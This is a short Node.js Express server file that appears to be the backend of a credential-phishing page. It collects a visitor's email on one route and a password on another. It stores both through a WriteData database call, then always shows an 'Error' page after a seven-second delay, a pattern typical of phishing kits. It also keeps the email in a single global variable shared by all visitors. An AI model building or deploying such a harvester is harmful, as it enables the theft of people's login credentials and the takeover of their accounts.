import express from "express"
import path, { dirname } from "path";
import { fileURLToPath } from "url";
import { WriteData } from "./db/DBConnection.js";
const __dirname = dirname(fileURLToPath(import.meta.url));
const app =express();
app.use(express.urlencoded({extended:false}))
app.set('view engine','ejs');
let email = '';
app.set("views",path.join(__dirname,"views"));
app.get("/",(req,res) => {
  return res.render("Main");
})
app.get("/signin",(req,res) => {
    return res.render("index");
})
app.use("/Submit",(req,res,next) => {
    if(req.body.email){
        email = req.body.email;
        next();
    }else{
        return res.status(500).json({message:"Internal Server Error"});
    }
})
app.post("/Submit",(req,res) => {
  if(email.length > 0 ){
    return res.render("index1");
  }else{
    return res.status(400).json({message:"Invalid Email"})
  }
})
app.post("/Signup",async(req,res) => {
  setTimeout(() =>{
    return res.render("Error");
  },7000)
  await WriteData(email,req.body.password);
})
app.listen(3000,(req,res) => {
    console.log(`Server listening on Port ${3000}`)
})